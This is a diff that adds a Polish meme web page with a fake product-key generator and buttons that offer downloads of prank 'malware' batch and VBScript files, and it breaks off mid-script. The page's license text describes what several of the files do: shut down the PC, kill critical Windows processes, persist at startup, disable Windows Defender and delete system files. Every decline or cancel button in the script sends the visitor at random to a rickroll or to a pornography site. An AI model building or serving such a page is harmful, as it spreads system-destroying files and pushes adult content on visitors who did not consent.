@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<title>Memy i Aktywacja</title>
+	<link
+		href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap"
+		rel="stylesheet">
+	<style>
+		body {
+			font-family: 'Roboto Mono', monospace;
+			text-align: center;
+			padding: 3vw;
+			background: linear-gradient(135deg, #0a001a, #1c0038, #2a0055);
+			color: #d1d1ff;
+			min-height: 100vh;
+			overflow-x: hidden;
+			animation: bgPulse 10s ease-in-out infinite;
+			background-size: 300% 300%;
+			font-weight: bold;
+			position: relative;
+			z-index: 1;
+			display: flex;
+			flex-direction: column;
+			justify-content: space-between;
+		}
+
+		@keyframes bgPulse {
+			0% {
+				background-position: 0% 50%;
+			}
+
+			50% {
+				background-position: 100% 50%;
+			}
+
+			100% {
+				background-position: 0% 50%;
+			}
+		}
+
+		body::before {
+			content: '';
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background: linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+			background-size: 100% 2px;
+			pointer-events: none;
+			z-index: 2;
+			animation: scanline 6s linear infinite;
+		}
+
+		@keyframes scanline {
+			0% {
+				transform: translateY(0);
+			}
+
+			100% {
+				transform: translateY(2px);
+			}
+		}
+
+		h1 {
+			font-family: 'Orbitron', sans-serif;
+			font-size: clamp(2rem, 5vw, 3.5rem);
+			color: #ff00ff;
+			text-shadow: 0 0 12px #ff00ff, 0 0 24px #00ffff, 0 0 36px #ff00ff;
+			margin-bottom: clamp(1.5rem, 3vw, 2.5rem);
+			animation: neonFlicker 1.8s infinite alternate;
+		}
+
+		@keyframes neonFlicker {
+			0% {
+				text-shadow: 0 0 12px #ff00ff, 0 0 24px #00ffff;
+			}
+
+			100% {
+				text-shadow: 0 0 18px #ff00ff, 0 0 36px #00ffff, 0 0 48px #ff00ff;
+			}
+		}
+
+		.button-container {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(clamp(180px, 20vw, 220px), 1fr));
+			gap: clamp(1rem, 2vw, 1.5rem);
+			max-width: 90vw;
+			margin: 0 auto;
+			padding: clamp(1rem, 2vw, 1.5rem);
+			background: rgba(0, 0, 0, 0.5);
+			border-radius: 15px;
+			box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+			z-index: 3;
+		}
+
+		button {
+			font-family: 'Roboto Mono', monospace;
+			font-size: clamp(1rem, 2.5vw, 1.2rem);
+			padding: clamp(0.8rem, 2vw, 1rem) clamp(1.5rem, 3vw, 2rem);
+			cursor: pointer;
+			border: 3px solid #00ffff;
+			border-radius: 10px;
+			background: linear-gradient(45deg, #ff00ff, #00ffff);
+			color: #000;
+			text-shadow: 0 0 10px #ffffff;
+			box-shadow: 0 0 20px #ff00ff, inset 0 0 15px #00ffff;
+			transition: all 0.4s ease;
+			position: relative;
+			overflow: hidden;
+			user-select: none;
+			font-weight: bold;
+		}
+
+		#installJustynianBtn {
+			border-color: #ff0000;
+			background: linear-gradient(45deg, #ff0000, #550000);
+			box-shadow: 0 0 30px #ff0000, inset 0 0 20px #550000;
+			animation: dangerPulse 0.8s infinite;
+		}
+
+		#installFsysBtn {
+			border-color: #ff0000;
+			background: linear-gradient(45deg, #8b0000, #ff0000);
+			box-shadow: 0 0 40px #8b0000, inset 0 0 25px #ff0000;
+			animation: ultraDangerPulse 0.6s infinite;
+		}
+
+		@keyframes dangerPulse {
+			0% {
+				box-shadow: 0 0 30px #ff0000, inset 0 0 20px #550000;
+			}
+
+			50% {
+				box-shadow: 0 0 50px #ff0000, inset 0 0 30px #550000;
+			}
+
+			100% {
+				box-shadow: 0 0 30px #ff0000, inset 0 0 20px #550000;
+			}
+		}
+
+		@keyframes ultraDangerPulse {
+			0% {
+				box-shadow: 0 0 40px #8b0000, inset 0 0 25px #ff0000;
+			}
+
+			50% {
+				box-shadow: 0 0 70px #8b0000, inset 0 0 40px #ff0000;
+			}
+
+			100% {
+				box-shadow: 0 0 40px #8b0000, inset 0 0 25px #ff0000;
+			}
+		}
+
+		button:hover {
+			transform: translateY(-5px) scale(1.05);
+			box-shadow: 0 0 30px #ff00ff, 0 0 40px #00ffff;
+			background: linear-gradient(45deg, #00ffff, #ff00ff);
+		}
+
+		#installJustynianBtn:hover {
+			box-shadow: 0 0 50px #ff0000, 0 0 60px #550000;
+			background: linear-gradient(45deg, #550000, #ff0000);
+		}
+
+		#installFsysBtn:hover {
+			box-shadow: 0 0 60px #8b0000, 0 0 80px #ff0000;
+			background: linear-gradient(45deg, #ff0000, #8b0000);
+		}
+
+		button:hover::after {
+			content: '';
+			position: absolute;
+			width: 100%;
+			height: 100%;
+			background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 10%, transparent 10%);
+			background-size: 20px 20px;
+			animation: particleSpark 1s infinite;
+			pointer-events: none;
+		}
+
+		@keyframes particleSpark {
+			0% {
+				opacity: 0.3;
+				transform: scale(1);
+			}
+
+			50% {
+				opacity: 0.6;
+				transform: scale(1.2);
+			}
+
+			100% {
+				opacity: 0.3;
+				transform: scale(1);
+			}
+		}
+
+		button:active {
+			transform: translateY(0) scale(1);
+			box-shadow: 0 0 15px #ff00ff, inset 0 0 10px #00ffff;
+		}
+
+		#installJustynianBtn:active {
+			box-shadow: 0 0 15px #ff0000, inset 0 0 10px #550000;
+		}
+
+		#installFsysBtn:active {
+			box-shadow: 0 0 15px #8b0000, inset 0 0 10px #ff0000;
+		}
+
+		#keyBox {
+			margin: clamp(1.5rem, 3vw, 2.5rem) auto;
+			font-size: clamp(1.5rem, 3vw, 2rem);
+			color: #00ff00;
+			background: rgba(0, 0, 0, 0.85);
+			padding: clamp(1rem, 2vw, 1.5rem);
+			border-radius: 12px;
+			border: 3px dashed #ff00ff;
+			text-shadow: 0 0 12px #00ff00, 0 0 24px #00ff00;
+			max-width: clamp(500px, 60vw, 700px);
+			animation: flicker 2.5s infinite;
+			letter-spacing: 2px;
+			z-index: 3;
+		}
+
+		@keyframes flicker {
+
+			0%,
+			100% {
+				opacity: 1;
+			}
+
+			50% {
+				opacity: 0.95;
+			}
+		}
+
+		#randomGlitch {
+			margin: clamp(1.5rem, 3vw, 2rem) auto;
+			font-family: 'Orbitron', sans-serif;
+			font-size: clamp(1.2rem, 2.5vw, 1.8rem);
+			color: #ff0000;
+			text-shadow: 0 0 10px #ff0000, 2px 2px 12px #00ffff, -2px -2px 12px #ff00ff;
+			animation: glitchText 0.8s infinite;
+			z-index: 3;
+		}
+
+		@keyframes glitchText {
+			0% {
+				transform: translate(0);
+			}
+
+			20% {
+				transform: translate(3px, -3px);
+			}
+
+			40% {
+				transform: translate(-3px, 3px);
+			}
+
+			60% {
+				transform: translate(2px, -2px);
+			}
+
+			80% {
+				transform: translate(-2px, 2px);
+			}
+
+			100% {
+				transform: translate(0);
+			}
+		}
+
+		.floating-emoji {
+			position: fixed;
+			top: 100vh;
+			animation: floatUp 4s ease-in-out infinite;
+			pointer-events: none;
+			user-select: none;
+			z-index: 1000;
+			font-size: clamp(1.5rem, 3vw, 2.5rem);
+			filter: drop-shadow(0 0 8px #ff00ff);
+			mix-blend-mode: screen;
+		}
+
+		@keyframes floatUp {
+			0% {
+				transform: translateY(0) rotate(0deg) scale(1);
+				opacity: 1;
+			}
+
+			50% {
+				transform: translateY(-60vh) rotate(360deg) scale(1.7);
+				opacity: 0.8;
+			}
+
+			100% {
+				transform: translateY(-100vh) rotate(720deg) scale(1);
+				opacity: 0;
+			}
+		}
+
+		#bellaWarning {
+			margin: clamp(1.5rem, 3vw, 2.5rem) auto;
+			font-size: clamp(1rem, 2.5vw, 1.5rem);
+			color: #ff5555;
+			background: rgba(0, 0, 0, 0.75);
+			padding: clamp(1rem, 2vw, 1.5rem);
+			border-radius: 10px;
+			border: 3px solid #ff5555;
+			text-shadow: 0 0 10px #ff5555, 0 0 20px #ff0000;
+			max-width: clamp(500px, 60vw, 700px);
+			animation: warningPulse 1.8s infinite;
+			z-index: 3;
+		}
+
+		@keyframes warningPulse {
+
+			0%,
+			100% {
+				transform: scale(1);
+				opacity: 1;
+			}
+
+			50% {
+				transform: scale(1.03);
+				opacity: 0.9;
+			}
+		}
+
+		.modal {
+			display: none;
+			position: fixed;
+			z-index: 2000;
+			left: 0;
+			top: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0, 0, 0, 0.9);
+			align-items: center;
+			justify-content: center;
+			padding: 1rem;
+		}
+
+		.modal-content {
+			background: linear-gradient(45deg, #1a0033, #0d0015);
+			border: 3px solid #ff00ff;
+			border-radius: 12px;
+			padding: clamp(1.5rem, 3vw, 2.5rem);
+			max-width: clamp(400px, 80vw, 700px);
+			width: 90%;
+			color: #d1d1ff;
+			font-family: 'Roboto Mono', monospace;
+			font-weight: bold;
+			text-shadow: 0 0 10px #00ffff;
+			box-shadow: 0 0 25px #ff00ff, 0 0 35px #00ffff;
+			animation: modalPop 0.4s ease-out;
+			max-height: 85vh;
+			overflow-y: auto;
+			position: relative;
+		}
+
+		@keyframes modalPop {
+			0% {
+				transform: scale(0.7);
+				opacity: 0;
+			}
+
+			100% {
+				transform: scale(1);
+				opacity: 1;
+			}
+		}
+
+		.close-btn {
+			position: absolute;
+			top: clamp(10px, 2vw, 15px);
+			right: clamp(10px, 2vw, 15px);
+			color: #ff5555;
+			font-size: clamp(1.5rem, 3vw, 2rem);
+			cursor: pointer;
+			text-shadow: 0 0 8px #ff5555;
+			transition: all 0.3s ease;
+			z-index: 2100;
+			line-height: 1;
+			padding: 0.5rem;
+		}
+
+		.close-btn:hover {
+			color: #ff0000;
+			text-shadow: 0 0 12px #ff0000;
+			transform: rotate(90deg);
+		}
+
+		.modal-content p {
+			line-height: 1.6;
+			margin: 0.8rem 0;
+			font-size: clamp(0.9rem, 2vw, 1.1rem);
+		}
+
+		.modal-content strong {
+			color: #00ff00;
+			text-shadow: 0 0 8px #00ff00;
+		}
+
+		.warning-modal .modal-content {
+			border-color: #ff0000;
+			box-shadow: 0 0 25px #ff0000, 0 0 35px #ff5555;
+		}
+
+		.warning-modal .modal-content h2 {
+			color: #ff0000;
+			text-shadow: 0 0 10px #ff0000;
+			font-family: 'Orbitron', sans-serif;
+			margin-bottom: 1.5rem;
+			font-size: clamp(1.5rem, 3vw, 2rem);
+		}
+
+		.warning-modal .modal-content .eula {
+			max-height: 50vh;
+			overflow-y: auto;
+			background: rgba(0, 0, 0, 0.5);
+			padding: 1rem;
+			border-radius: 8px;
+			margin-bottom: 1.5rem;
+			font-size: clamp(0.8rem, 1.8vw, 0.95rem);
+			line-height: 1.4;
+		}
+
+		.modal-content button {
+			margin: 0.5rem;
+			padding: clamp(0.6rem, 1.5vw, 0.8rem) clamp(1rem, 2vw, 1.5rem);
+			font-size: clamp(0.9rem, 2vw, 1rem);
+		}
+
+		.accept-btn {
+			background: linear-gradient(45deg, #ff0000, #ff5555);
+			border-color: #ff0000;
+		}
+
+		.decline-btn {
+			background: linear-gradient(45deg, #00ff00, #55ff55);
+			border-color: #00ff00;
+		}
+
+		.footer {
+			margin-top: clamp(1.5rem, 3vw, 2rem);
+			font-size: clamp(0.8rem, 2vw, 1rem);
+			color: #00ffff;
+			text-shadow: 0 0 8px #00ffff;
+			z-index: 3;
+		}
+
+		.footer a {
+			color: #ff00ff;
+			text-decoration: none;
+			transition: all 0.3s ease;
+		}
+
+		.footer a:hover {
+			text-shadow: 0 0 12px #ff00ff;
+		}
+
+		@media (max-width: 600px) {
+			body {
+				padding: 2vw;
+			}
+
+			.button-container {
+				grid-template-columns: 1fr;
+			}
+
+			h1 {
+				font-size: clamp(1.5rem, 4vw, 2.5rem);
+			}
+
+			#keyBox,
+			#bellaWarning {
+				max-width: 90vw;
+			}
+		}
+	</style>
+</head>
+
+<body>
+	<h1>Memy i Aktywacja</h1>
+	<div class="button-container">
+		<button id="generateBtn">Generuj klucz</button>
+		<button id="activateBtn">Aktywuj</button>
+		<button id="installTrojanBtn">Zainstalluj Trojana!</button>
+		<button id="installRATBtn">Zainstalluj RAT!</button>
+		<button id="installKeyloggerBtn">Zainstalluj Keylogger!</button>
+		<button id="installBTCMinerBtn">Pobierz koparkę BTC!</button>
+		<button id="removeVirusesBtn">Usuń wirusy!</button>
+		<button id="installWannaCryBtn">Zainstalluj WannaCry / WannaCrypt0r!</button>
+		<button id="installBackdoorBtn">Zainstalluj Backdoor!</button>
+		<button id="installAdwareBtn">Zainstalluj Adware!</button>
+		<button id="installSpywareBtn">Zainstalluj Spyware!</button>
+		<button id="installRansomwareBtn">Zainstalluj Ransomware!</button>
+		<button id="installWormBtn">Zainstalluj Worm!</button>
+		<button id="installJustynianBtn">Zainstalluj Justynian!</button>
+		<button id="installFsysBtn">Zainstalluj Fsys!</button>
+		<button id="infoBtn">INFO</button>
+		<button id="discordHelpBtn">Nie pobiera się? Zapytaj axolotl_new._24792 na Discord!</button>
+	</div>
+	<div id="keyBox">----- ----- ----- ----- -----</div>
+	<div id="randomGlitch"></div>
+	<div id="bellaWarning">
+		Uwaga! Każde kliknięcie to krok bliżej do BANa w IT. Nie odpowiadam za skutki uboczne! ⚠️
+	</div>
+	<div class="footer">
+		Inspired by <a href="https://www.youtube.com/channel/UCRhJGX6dOVAZIJqDhgzAtNg">Low Quality Music</a> | Check out
+		the epic guitar solo at 4:55!
+	</div>
+
+	<!-- General Modal -->
+	<div id="modal" class="modal">
+		<div class="modal-content">
+			<span class="close-btn">&times;</span>
+			<div id="modal-text"></div>
+		</div>
+	</div>
+
+	<!-- Warning Modal -->
+	<div id="warningModal" class="modal warning-modal">
+		<div class="modal-content">
+			<span class="close-btn">&times;</span>
+			<h2>UWAGA ⚠️</h2>
+			<p id="warning-text"></p>
+			<div id="eula-content" class="eula"></div>
+			<button id="acceptBtn" class="accept-btn">Akceptuję</button>
+			<button id="declineBtn" class="decline-btn">Nie akceptuję</button>
+		</div>
+	</div>
+
+	<!-- Justynian Second EULA Modal -->
+	<div id="justynianEulaModal" class="modal warning-modal">
+		<div class="modal-content">
+			<span class="close-btn">&times;</span>
+			<h2>OSTATECZNE OSTRZEŻENIE JUSTYNIAN ⚠️</h2>
+			<p id="justynian-eula-text">Potwierdź, że rozumiesz konieczność użycia trybu awaryjnego po uruchomieniu tego
+				pliku!</p>
+			<div id="justynian-eula-content" class="eula">
+				<p><strong>Justynian v3 Druga Umowa Licencyjna (EULA)</strong></p>
+				<p>Potwierdzając, zgadzasz się, że:</p>
+				<p>1. <strong>Ekstremalne Ryzyko</strong>: Plik justynian.bat v3 to APOKALIPTYCZNY ŚCIEK internetu i
+					może zniszczyć Twój system, wymagając trybu awaryjnego.</p>
+				<p>2. <strong>Świadomość Konsekwencji</strong>: Rozumiesz, że uruchomienie tego pliku może wymagać trybu
+					awaryjnego do naprawy.</p>
+				<p>3. <strong>Brak Odpowiedzialności</strong>: Twórca, axolotl_new._24792, nie ponosi odpowiedzialności
+					za szkody.</p>
+				<p>4. <strong>Potwierdzenie</strong>: Wpisz:
+					<strong>I know I will need to open safe mode (tryb awaryjny)</strong>.</p>
+				<input type="text" id="eulaInput" style="width: 100%; padding: 0.5rem; margin: 1rem 0; font-family: 'Roboto Mono', monospace; font-size: clamp(0.9rem, 2vw, 1rem);">
+			</div>
+				<button id="confirmJustynianBtn" class="accept-btn">Potwierdzam</button>
+				<button id="cancelJustynianBtn" class="decline-btn">Anuluj</button>
+			</div>
+		</div>
+
+		<!-- Fsys Second EULA Modal -->
+		<div id="fsysEulaModal" class="modal warning-modal">
+			<div class="modal-content">
+				<span class="close-btn">&times;</span>
+				<h2>OSTATECZNE OSTRZEŻENIE FSYS ⚠️</h2>
+				<p id="fsys-eula-text">Potwierdź, że rozumiesz, że ten plik ZNISZCZY Twój komputer, wymagając
+					reinstalacji systemu!</p>
+				<div id="fsys-eula-content" class="eula">
+					<p><strong>Fsys v3 Druga Umowa Licencyjna (EULA)</strong></p>
+					<p>Potwierdzając, zgadzasz się, że:</p>
+					<p>1. <strong>Apokaliptyczne Ryzyko</strong>: Plik fucksystem.bat v3 to NAJWIĘKSZE ZAGROŻENIE
+						internetu i zniszczy Twój system, wymagając reinstalacji Windows.</p>
+					<p>2. <strong>Świadomość Konsekwencji</strong>: Rozumiesz, że ten plik zablokuje Twój komputer,
+						niszcząc procesy i dane.</p>
+					<p>3. <strong>Brak Odpowiedzialności</strong>: Twórca, axolotl_new._24792, nie ponosi
+						odpowiedzialności za szkody.</p>
+					<p>4. <strong>Potwierdzenie</strong>: Wpisz: <strong>I know this program will brick my pc</strong>.
+					</p>
+					<p>5. <strong>Poczwórna Weryfikacja</strong>: Po 4 nieudanych próbach, musisz wpisać tekst
+						poprawnie.</p>
+					<input type="text" id="fsysEulaInput" style="width: 100%; padding: 0.5rem; margin: 1rem 0; font-family: 'Roboto Mono', monospace; font-size: clamp(0.9rem, 2vw, 1rem);">
+			</div>
+					<button id="confirmFsysBtn" class="accept-btn">Potwierdzam</button>
+					<button id="cancelFsysBtn" class="decline-btn">Anuluj</button>
+				</div>
+			</div>
+
+			<script>
+				// Generate random key
+		function randomKey() {
+			const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+			let key = "";
+			for (let i = 0; i < 25; i++) {
+				key += chars.charAt(Math.floor(Math.random() * chars.length));
+				if ((i + 1) % 5 === 0 && i !== 24) key += "-";
+			}
+			return key;
+		}
+
+		// Element references
+		const keyBox = document.getElementById("keyBox");
+		const generateBtn = document.getElementById("generateBtn");
+		const activateBtn = document.getElementById("activateBtn");
+		const randomGlitch = document.getElementById("randomGlitch");
+		const installTrojanBtn = document.getElementById("installTrojanBtn");
+		const installRATBtn = document.getElementById("installRATBtn");
+		const installKeyloggerBtn = document.getElementById("installKeyloggerBtn");
+		const installBTCMinerBtn = document.getElementById("installBTCMinerBtn");
+		const removeVirusesBtn = document.getElementById("removeVirusesBtn");
+		const installWannaCryBtn = document.getElementById("installWannaCryBtn");
+		const installBackdoorBtn = document.getElementById("installBackdoorBtn");
+		const installAdwareBtn = document.getElementById("installAdwareBtn");
+		const installSpywareBtn = document.getElementById("installSpywareBtn");
+		const installRansomwareBtn = document.getElementById("installRansomwareBtn");
+		const installWormBtn = document.getElementById("installWormBtn");
+		const installJustynianBtn = document.getElementById("installJustynianBtn");
+		const installFsysBtn = document.getElementById("installFsysBtn");
+		const infoBtn = document.getElementById("infoBtn");
+		const discordHelpBtn = document.getElementById("discordHelpBtn");
+
+		// Modal elements
+		const modal = document.getElementById("modal");
+		const modalText = document.getElementById("modal-text");
+		const closeBtn = document.querySelector("#modal .close-btn");
+		const warningModal = document.getElementById("warningModal");
+		const warningText = document.getElementById("warning-text");
+		const eulaContent = document.getElementById("eula-content");
+		const warningCloseBtn = document.querySelector("#warningModal .close-btn");
+		const acceptBtn = document.getElementById("acceptBtn");
+		const declineBtn = document.getElementById("declineBtn");
+		const justynianEulaModal = document.getElementById("justynianEulaModal");
+		const justynianEulaText = document.getElementById("justynian-eula-text");
+		const justynianEulaContent = document.getElementById("justynian-eula-content");
+		const confirmJustynianBtn = document.getElementById("confirmJustynianBtn");
+		const cancelJustynianBtn = document.getElementById("cancelJustynianBtn");
+		const eulaInput = document.getElementById("eulaInput");
+		const fsysEulaModal = document.getElementById("fsysEulaModal");
+		const fsysEulaText = document.getElementById("fsys-eula-text");
+		const fsysEulaContent = document.getElementById("fsys-eula-content");
+		const confirmFsysBtn = document.getElementById("confirmFsysBtn");
+		const cancelFsysBtn = document.getElementById("cancelFsysBtn");
+		const fsysEulaInput = document.getElementById("fsysEulaInput");
+
+		// EULA base template
+		const eulaBase = `
+			<p><strong>End User License Agreement (EULA)</strong></p>
+			<p>By downloading and executing this file, you acknowledge and agree to the following terms:</p>
+			<p>1. <strong>No Liability</strong>: The creator, axolotl_new._24792, and associated entities ("the Creator") are not responsible for any damages, data loss, system instability, or other consequences resulting from this file's use, including system crashes, BSOD, or data loss.</p>
+			<p>2. <strong>Risk Acknowledgment</strong>: This file is for entertainment and educational purposes only. It may disrupt your system. Use in a controlled environment (e.g., virtual machine).</p>
+			<p>3. <strong>No Warranty</strong>: Provided "as is" without warranties of any kind.</p>
+			<p>4. <strong>User Responsibility</strong>: You are solely responsible for any actions taken with this file.</p>
+			<p>5. <strong>Indemnification</strong>: You indemnify the Creator from any claims or damages arising from this file's use.</p>
+			<p>6. <strong>Termination</strong>: This agreement is effective upon download and remains until the file is deleted. The Creator may modify this EULA without notice.</p>
+			<p>7. <strong>Memes and Humor</strong>: This is part of a memetic project inspired by <a href="https://www.youtube.com/channel/UCRhJGX6dOVAZIJqDhgzAtNg">Low Quality Music</a>. The Creator is not responsible for pierogi-related consequences or rickrolls.</p>
+			<p>By clicking "Accept," you confirm you have read and understood these terms. Click "Decline" to avoid downloading.</p>
+		`;
+
+		// EULA templates
+		const eulaTemplates = {
+			trojan: `
+				<p><strong>File: trojan.txt</strong></p>
+				<p><strong>Risk Level: Safe</strong></p>
+				<p>This file contains the text "Gratulacje wlasnie masz trojana :)". It is a harmless text file intended for humorous purposes and does not perform any malicious actions.</p>
+				${eulaBase}
+			`,
+			rat: `
+				<p><strong>File: rat.vbs</strong></p>
+				<p><strong>Risk Level: Low</strong></p>
+				<p>This VBScript displays repeated popup messages with the text "masz RAT woomp woomp" in a loop, which can be annoying and difficult to close without terminating the script.</p>
+				${eulaBase}
+			`,
+			keylogger: `
+				<p><strong>File: keylogger.bat</strong></p>
+				<p><strong>Risk Level: Medium</strong></p>
+				<p>This batch file executes a shutdown command (<code>shutdown -s -t 0</code>), immediately turning off your computer. It does not log keys but can cause data loss if unsaved work is open.</p>
+				${eulaBase}
+			`,
+			btcMiner: `
+				<p><strong>File: btc_miner.bat</strong></p>
+				<p><strong>Risk Level: Low</strong></p>
+				<p>This batch file simulates Bitcoin mining with a looping progress animation (0% to 100%). It adds itself to the Windows startup folder, causing it to run on system boot, which may slow down your system.</p>
+				${eulaBase}
+			`,
+			removeViruses: `
+				<p><strong>File: usun_wirusy.bat</strong></p>
+				<p><strong>Risk Level: High</strong></p>
+				<p>This batch file simulates virus removal by displaying messages and attempting to terminate critical system processes (<code>explorer.exe</code>, <code>svchost.exe</code>, <code>csrss.exe</code>, <code>winlogon.exe</code>), which may cause system instability or BSOD.</p>
+				${eulaBase}
+			`,
+			wannaCry: `
+				<p><strong>File: wannacrypt0r.bat</strong></p>
+				<p><strong>Risk Level: Very High</strong></p>
+				<p>This batch file mimics WannaCry ransomware behavior by adding itself to the startup folder, terminating <code>explorer.exe</code> and <code>taskmgr.exe</code>, and restarting itself in a loop, potentially causing significant system disruption.</p>
+				${eulaBase}
+			`,
+			backdoor: `
+				<p><strong>File: backdoor.bat</strong></p>
+				<p><strong>Risk Level: Low</strong></p>
+				<p>This batch file opens <a href="https://www.pornhub.com">Pornhub</a> in your default browser in a continuous loop, which can be disruptive and inappropriate.</p>
+				${eulaBase}
+			`,
+			adware: `
+				<p><strong>File: adware.bat</strong></p>
+				<p><strong>Risk Level: Low</strong></p>
+				<p>This batch file adds itself to the startup folder and searches for <code>usun_wirusy.bat</code>. If found, it displays a message; otherwise, it prompts to contact axolotl_new._24792 on Discord. It runs in a loop, potentially slowing the system.</p>
+				${eulaBase}
+			`,
+			spyware: `
+				<p><strong>File: spyware.bat</strong></p>
+				<p><strong>Risk Level: Very High</strong></p>
+				<p>This batch file attempts to terminate critical system processes (<code>svchost.exe</code>, <code>csrss.exe</code>, <code>winlogon.exe</code>), which can cause system instability or BSOD.</p>
+				${eulaBase}
+			`,
+			ransomware: `
+				<p><strong>File: ransomware.bat</strong></p>
+				<p><strong>Risk Level: High</strong></p>
+				<p>This batch file adds itself to the startup folder, enables Wi-Fi, terminates <code>taskmgr.exe</code> and <code>explorer.exe</code>, opens random websites, displays popup messages, creates a ransom note in Notepad, and maximizes system volume.</p>
+				${eulaBase}
+			`,
+			worm: `
+				<p><strong>Files: worm.bat, job_application.txt, worm_message.vbs</strong></p>
+				<p><strong>Risk Level: High</strong></p>
+				<p>This batch file adds itself to the startup folder, enables Wi-Fi, terminates <code>taskmgr.exe</code> and <code>explorer.exe</code>, opens multiple websites, displays popup messages, creates a data leak note in Notepad, runs a command prompt with <code>dir /s</code>, simulates system deletion, and downloads additional files.</p>
+				${eulaBase}
+			`,
+			justynian: `
+				<p><strong>File: justynian.bat</strong></p>
+				<p><strong>Risk Level: Ultra Apocalyptic</strong></p>
+				<p>This batch file, dubbed the "APOKALIPTYCZNY ŚCIEK INTERNETU v3," adds itself to the startup folder, maximizes system volume, enables Wi-Fi, terminates ALL processes including critical ones, disables Windows Defender, opens random websites every 2 seconds, creates thousands of junk files, attempts to delete critical system files, and causes extreme system lag, requiring safe mode to recover.</p>
+				${eulaBase}
+			`,
+			fsys: `
+				<p><strong>File: fucksystem.bat</strong></p>
+				<p><strong>Risk Level: Catastrophic</strong></p>
+				<p>This batch file, dubbed the "ABSOLUTNY ANIHILATOR SYSTEMU v3," adds itself to the startup folder, maximizes system volume, enables Wi-Fi, terminates ALL processes including critical system ones, opens random websites every 1 second, creates tens of thousands of junk files, attempts to delete critical system files, and causes immediate system failure, requiring a full Windows reinstall.</p>
+				${eulaBase}
+			`
+		};
+
+		// Show modal
+		function showModal(text) {
+			modalText.innerHTML = text.replace(/\n/g, '<br>');
+			modal.style.display = "flex";
+		}
+
+		// Close modal
+		function closeModal() {
+			modal.style.display = "none";
+			modalText.innerHTML = '';
+		}
+
+		// Show warning modal
+		function showWarningModal(text, eula, downloadCallback) {
+			warningText.textContent = text;
+			eulaContent.innerHTML = eula;
+			warningModal.style.display = "flex";
+			acceptBtn.onclick = () => {
+				downloadCallback();
+				closeWarningModal();
+			};
+			declineBtn.onclick = () => {
+				const redirect = Math.random() < 0.5 ? "https://www.youtube.com/watch?v=O5cIZ77jBTw" : "https://www.pornhub.com";
+				window.location.href = redirect;
+				closeWarningModal();
+			};
+		}
+
+		// Close warning modal
+		function closeWarningModal() {
+			warningModal.style.display = "none";
+			warningText.textContent = '';
+			eulaContent.innerHTML = '';
+		}
+
+		// Show Justynian EULA modal
+		function showJustynianEulaModal(downloadCallback) {
+			justynianEulaModal.style.display = "flex";
+			eulaInput.value = "";
+			confirmJustynianBtn.onclick = () => {
+				if (eulaInput.value === "I know I will need to open safe mode (tryb awaryjny)") {
+					downloadCallback();
+					closeJustynianEulaModal();
+				} else {
+					showModal("Błąd: Wpisz dokładny tekst: <strong>I know I will need to open safe mode (tryb awaryjny)</strong>");
+				}
+			};
+			cancelJustynianBtn.onclick = () => {
+				const redirect = Math.random() < 0.5 ? "https://www.youtube.com/watch?v=O5cIZ77jBTw" : "https://www.pornhub.com";
+				window.location.href = redirect;
+				closeJustynianEulaModal();
+			};
+		}
+
+		// Close Justynian EULA modal
+		function closeJustynianEulaModal() {
+			justynianEulaModal.style.display = "none";
+			justynianEulaText.textContent = '';
+			justynianEulaContent.innerHTML = '';
+			eulaInput.value = '';
+		}
+
+		// Show Fsys EULA modal with failure counter
+		let fsysFailureCount = 0;
+		function showFsysEulaModal(downloadCallback) {
+			fsysEulaModal.style.display = "flex";
+			fsysEulaInput.value = "";
+			confirmFsysBtn.onclick = () => {
+				if (fsysEulaInput.value === "I know this program will brick my pc") {
+					fsysFailureCount = 0;
+					downloadCallback();
+					closeFsysEulaModal();
+				} else {
+					fsysFailureCount++;
+					if (fsysFailureCount < 4) {
+						showModal(`Błąd: Wpisz dokładny tekst: <strong>I know this program will brick my pc</strong>. Próba ${fsysFailureCount}/4.`);
+					} else {
+						showModal(`
+							<p><strong>ZA DUŻO BŁĘDÓW! 😈</strong></p>
+							<p>Przegrałeś grę w EULA! Wpisz: <strong>I know this program will brick my pc</strong>.</p>
+							<input type="text" id="forceFsysInput" style="width: 100%; padding: 0.5rem; margin: 1rem 0; font-family: 'Roboto Mono', monospace;">
+							<button id="forceFsysBtn" class="accept-btn">Spróbuj ponownie</button>
+						`);
+						const forceFsysInput = document.getElementById("forceFsysInput");
+						const forceFsysBtn = document.getElementById("forceFsysBtn");
+						forceFsysBtn.onclick = () => {
+							if (forceFsysInput.value === "I know this program will brick my pc") {
+								fsysFailureCount = 0;
+								downloadCallback();
+								closeFsysEulaModal();
+								closeModal();
+							} else {
+								showModal("Nadal źle! Wpisz: <strong>I know this program will brick my pc</strong>. 😈");
+							}
+						};
+					}
+				}
+			};
+			cancelFsysBtn.onclick = () => {
+				const redirect = Math.random() < 0.5 ? "https://www.youtube.com/watch?v=O5cIZ77jBTw" : "https://www.pornhub.com";
+				window.location.href = redirect;
+				closeFsysEulaModal();
+			};
+		}
+
+		// Close Fsys EULA modal
+		function closeFsysEulaModal() {
+			fsysEulaModal.style.display = "none";
+			fsysEulaText.textContent = '';
+			fsysEulaContent.innerHTML = '';
+			fsysEulaInput.value = '';
+		}
+
+		// Close modals on click
+		closeBtn.onclick = closeModal;
+		warningCloseBtn.onclick = closeWarningModal;
+		modal.onclick = function(event) { if (event.target === modal) closeModal(); };
+		warningModal.onclick = function(event) { if (event.target === warningModal) closeWarningModal(); };
+		justynianEulaModal.onclick = function(event) { if (event.target === justynianEulaModal) closeJustynianEulaModal(); };
+		fsysEulaModal.onclick = function(event) { if (event.target === fsysEulaModal) closeFsysEulaModal(); };
+
+		// Generate key
+		generateBtn.onclick = () => {
+			keyBox.textContent = randomKey();
+			randomGlitch.textContent = "🎉 NOWY KLUCZ WYGENEROWANY 🎉";
+		};
+
+		// Activate button
+		activateBtn.onclick = () => {
+			showModal("💀 AKTYWACJA MEMICZNA W TRAKCIE! PRZYGOTUJ SIĘ NA BAN! 💀");
